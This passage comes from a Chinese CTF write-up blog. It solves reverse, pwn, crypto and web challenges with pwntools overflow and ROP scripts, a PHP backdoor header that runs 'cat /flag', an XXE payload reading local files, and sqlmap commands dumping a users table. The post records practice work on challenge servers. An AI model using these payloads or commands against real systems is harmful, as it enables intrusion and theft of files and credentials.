class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_45E940</span>():<br>    v2 = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;&#123; &quot;</span>)<br>    v2.extend([<span class="hljs-number">18</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">108</span>, <span class="hljs-number">65</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>, <span class="hljs-number">80</span>, <span class="hljs-number">125</span>, <span class="hljs-number">38</span>, <span class="hljs-number">124</span>, <span class="hljs-number">111</span>, <span class="hljs-number">74</span>, <span class="hljs-number">49</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>, <span class="hljs-number">94</span>, <span class="hljs-number">108</span>, <span class="hljs-number">84</span>, <span class="hljs-number">6</span>])<br>    v2.extend(<span class="hljs-string">b&quot;`S,yhn _uec&#123;&quot;</span>)<br>    v2.extend([<span class="hljs-number">127</span>, <span class="hljs-number">119</span>, <span class="hljs-number">96</span>, <span class="hljs-number">48</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">92</span>, <span class="hljs-number">29</span>, <span class="hljs-number">81</span>, <span class="hljs-number">107</span>, <span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">64</span>, <span class="hljs-number">12</span>, <span class="hljs-number">43</span>, <span class="hljs-number">76</span>, <span class="hljs-number">86</span>, <span class="hljs-number">13</span>, <span class="hljs-number">114</span>, <span class="hljs-number">1</span>, <span class="hljs-number">117</span>, <span class="hljs-number">126</span>, <span class="hljs-number">0</span>])<br>    v5 = <span class="hljs-built_in">bytearray</span>(<br>        [<span class="hljs-number">18</span>, <span class="hljs-number">64</span>, <span class="hljs-number">98</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">65</span>, <span class="hljs-number">32</span>, <span class="hljs-number">12</span>, <span class="hljs-number">48</span>, <span class="hljs-number">65</span>, <span class="hljs-number">31</span>, <span class="hljs-number">78</span>, <span class="hljs-number">62</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">1</span>, <span class="hljs-number">57</span>, <span class="hljs-number">96</span>, <span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">62</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">44</span>, <span class="hljs-number">65</span>, <span class="hljs-number">78</span>, <span class="hljs-number">32</span>, <span class="hljs-number">16</span>, <span class="hljs-number">97</span>, <span class="hljs-number">54</span>, <span class="hljs-number">16</span>, <span class="hljs-number">44</span>, <span class="hljs-number">52</span>, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">89</span>, <span class="hljs-number">45</span>, <span class="hljs-number">32</span>, <span class="hljs-number">65</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>, <span class="hljs-number">18</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>]<br>    )<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):<br>        <span class="hljs-comment"># print(v2[i])</span><br>        v2[i] ^= v5[i]<br>        v2[i] ^= <span class="hljs-number">0x13</span><br>        <span class="hljs-comment"># print(chr(v2[i]))</span><br><br>    <span class="hljs-keyword">return</span> v2.decode()<br><br><br><span class="hljs-built_in">print</span>(sub_45E940())<br><br></code></pre></td></tr></table></figure><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><blockquote><p>菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;what?\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> first = atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are wrong, sorry.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so close, dude!\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Brr wrrr grr\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get your key: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, hash);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>审计代码</p><p>前面的判断都可以删去，同时把 hash 得参数填入即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hash = <span class="hljs-number">0xcafe</span> * <span class="hljs-number">31337</span> + (<span class="hljs-number">8</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>) - <span class="hljs-number">1615810207</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322191714265.png" alt="image-20240322191714265"></p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p><img src="/posts/df9d333d/image-20240322230144271.png" alt="image-20240322230144271"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">v13 = <span class="hljs-string">&quot;437261636b4d654a757374466f7246756e&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">34</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(v13[i : i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment"># CrackMeJustForFun</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><img src="/posts/df9d333d/image-20240320225318482.png" alt="image-20240320225318482"></p><p>于是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">62725</span>)<br><span class="hljs-comment"># p.recvline()</span><br>p.recvuntil(<span class="hljs-string">b&quot;lets get helloworld for bof\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1853186401</span>))<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>read栈溢出</p><p><img src="/posts/df9d333d/image-20240320234131437.png" alt="image-20240320234131437"></p><p>pwndbg调试</p><p><img src="/posts/df9d333d/image-20240320233805057.png" alt="image-20240320233805057"></p><p>跳到输入点</p><p><img src="/posts/df9d333d/image-20240320233857781.png" alt="image-20240320233857781"></p><p><img src="/posts/df9d333d/image-20240320233928801.png" alt="image-20240320233928801"></p><p>得到</p><p><img src="/posts/df9d333d/image-20240320233947193.png" alt="image-20240320233947193"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">52815</span>)<br><span class="hljs-comment"># p = process(&quot;./level0&quot;)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Hello, World\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">136</span>) + p64(<span class="hljs-number">0x4005F4</span>) + p64(<span class="hljs-number">0x400596</span>)) <span class="hljs-comment"># 136 + ret_addr + systemcall_addr</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>查找字符串表有 <code>/bin/su</code>，以及根据提示是 ROP</p><p><img src="/posts/df9d333d/image-20240321174408428.png" alt="image-20240321174408428"></p><p><code>0x88 + 0x04</code> 覆盖掉，并用 system 的地址替换本来的返回地址</p><p><img src="/posts/df9d333d/image-20240321174503049.png" alt="image-20240321174503049"></p><p>system 的返回用任意4字符覆盖，最后拼接 <code>/bin/su</code> 的地址</p><p><img src="/posts/df9d333d/image-20240321174617903.png" alt="image-20240321174617903"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;i386&quot;</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">56419</span>)<br><span class="hljs-comment"># p = process(&quot;./level2&quot;)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Input:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x04</span>) + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">4</span> + p32(<span class="hljs-number">0x0804A024</span>))<br><span class="hljs-comment"># p.sendline(b&quot;ls&quot;)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><blockquote><p>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。<br>你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p></blockquote><p>如题名</p><p><img src="/posts/df9d333d/image-20240322191917870.png" alt="image-20240322191917870"></p><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><blockquote><p>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p></blockquote><p><code>oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192041263.png" alt="image-20240322192041263"></p><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><blockquote><p>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p></blockquote><p><code>11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192148888.png" alt="image-20240322192148888"></p><h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><blockquote><p>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p></blockquote><p><code>ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192321613.png" alt="image-20240322192321613"></p><h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><blockquote><p>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Morse">--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-<br></code></pre></td></tr></table></figure><p>摩斯密码解密得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 培根密码">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322192612476.png" alt="image-20240322192612476"></p><p>cyberpeace{} 包裹得 flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qsnctf-2024#Round1</title>
    <link href="/posts/14e77824/"/>
    <url>/posts/14e77824/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h2><p>考查 <code>MD5碰撞</code></p><p><img src="/posts/14e77824/image-20240229194659778.png" alt="image-20240229194659778"></p><p>随便上传文件，将其发送到 Repeater</p><p><img src="/posts/14e77824/image-20240229193959031.png" alt="image-20240229193959031"></p><p>发现需要 pdf 的 MIME</p><p>设置 Content-Type 为 application&#x2F;pdf</p><p><img src="/posts/14e77824/image-20240229194119131.png" alt="image-20240229194119131"></p><p>猜测题目意思为不同文件，但需要 &#96;md5($a) &#x3D;&#x3D; md5($b)</p><p>根据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;240610708&#x27;</span>); <span class="hljs-comment">// = 0e462097431906509019562988736854</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>); <span class="hljs-comment">// = 0e830400451993494058024219903391</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以文件内容修改为 <code>240610708</code> 与 <code>QNKCDZO</code></p><p><img src="/posts/14e77824/image-20240229194526180.png" alt="image-20240229194526180"></p><h2 id="PHP的后门"><a href="#PHP的后门" class="headerlink" title="PHP的后门"></a>PHP的后门</h2><p><img src="/posts/14e77824/image-20240229194751015.png" alt="image-20240229194751015"></p><p>根据提示查看 服务器php版本</p><p><img src="/posts/14e77824/image-20240229194832339.png" alt="image-20240229194832339"></p><p>搜索可知此版本有远程命令执行漏洞</p><p>修改 <code>User-Agentt: zerodiumsystem(&quot;cat /flag&quot;);</code></p><p><img src="/posts/14e77824/image-20240229195032492.png" alt="image-20240229195032492"></p><h2 id="PHP的XXE"><a href="#PHP的XXE" class="headerlink" title="PHP的XXE"></a>PHP的XXE</h2><p>给了 phpinfo</p><p><img src="/posts/14e77824/image-20240229195407720.png" alt="image-20240229195407720"></p><p>搜索可知 dom.php 可以触发XXE漏洞</p><p>随手拿个poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">test</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240229195634852.png" alt="image-20240229195634852"></p><h2 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h2><p>简单的布尔盲注，顺便试下 sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 --dbs<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301185843180.png" alt="image-20240301185843180"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf --tables<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301185923577.png" alt="image-20240301185923577"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf -T users --columns<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301190001650.png" alt="image-20240301190001650"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf -T users -C password,username --dump<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301190127496.png" alt="image-20240301190127496"></p><h2 id="雏形系统"><a href="#雏形系统" class="headerlink" title="雏形系统"></a>雏形系统</h2><p>php 反序列化</p><p>拿 dirsearch 扫了一下得到 &#x2F;<a href="http://www.zip/">www.zip</a></p><p><img src="/posts/14e77824/image-20240301191342399.png" alt="image-20240301191342399"></p><p>发现php加密了</p><p>找个解密网站得到原始代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shi</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$next</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;next::<span class="hljs-title function_ invoke__">PLZ</span>(<span class="hljs-variable">$this</span>-&gt;pass);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wo</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$intention</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hi Try serialize Me!&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">inspect</span>();<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inspect</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;sex==<span class="hljs-string">&#x27;boy&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;age==<span class="hljs-string">&#x27;eighteen&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;intention;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;🙅18岁🈲&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>, <span class="hljs-variable">$do</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$b</span>;<br>            <span class="hljs-variable">$b</span>(<span 